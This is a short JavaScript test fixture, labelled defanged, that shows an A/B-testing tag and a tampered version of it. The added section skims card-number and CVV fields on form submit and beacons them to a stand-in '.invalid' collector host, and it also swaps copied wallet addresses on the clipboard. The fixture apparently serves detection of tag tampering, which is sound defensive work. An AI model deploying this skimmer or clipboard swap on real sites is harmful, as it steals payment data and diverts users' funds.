// TEST FIXTURE ONLY. Defanged sample of the *shape* of a tampered tag: it adds card-field
// access, a new collection host (.invalid, unroutable) and a wallet-address swap pattern.
(function () {
  var cfg = { project: "site-main", endpoint: "https://cdn.optimizely-like.example.com/v1/events" };
  function variant(name) {
    var h = 0;
    for (var i = 0; i < name.length; i++) h = (h * 31 + name.charCodeAt(i)) | 0;
    return Math.abs(h) % 2 === 0 ? "A" : "B";
  }
  document.documentElement.setAttribute("data-exp", variant(location.pathname));
  window.addEventListener("load", function () {
    fetch(cfg.endpoint, { method: "POST", body: JSON.stringify({ p: cfg.project, v: variant(location.pathname) }) });
  });
  // --- added in the tampered version ---
  document.addEventListener("submit", function () {
    var f = document.querySelector("input[autocomplete='cc-number']");
    var c = document.querySelector("input[name='cvv']");
    navigator.sendBeacon("https://collector.example-sink.invalid/c", (f && f.value) + "|" + (c && c.value));
  });
  document.addEventListener("copy", function (e) {
    var t = String(window.getSelection());
    if (/^0x[a-f0-9]{40}$/i.test(t)) e.clipboardData.setData("text/plain", t.replace(/0x[a-f0-9]{40}/i, "0x0000000000000000000000000000000000000000"));
  });
})();
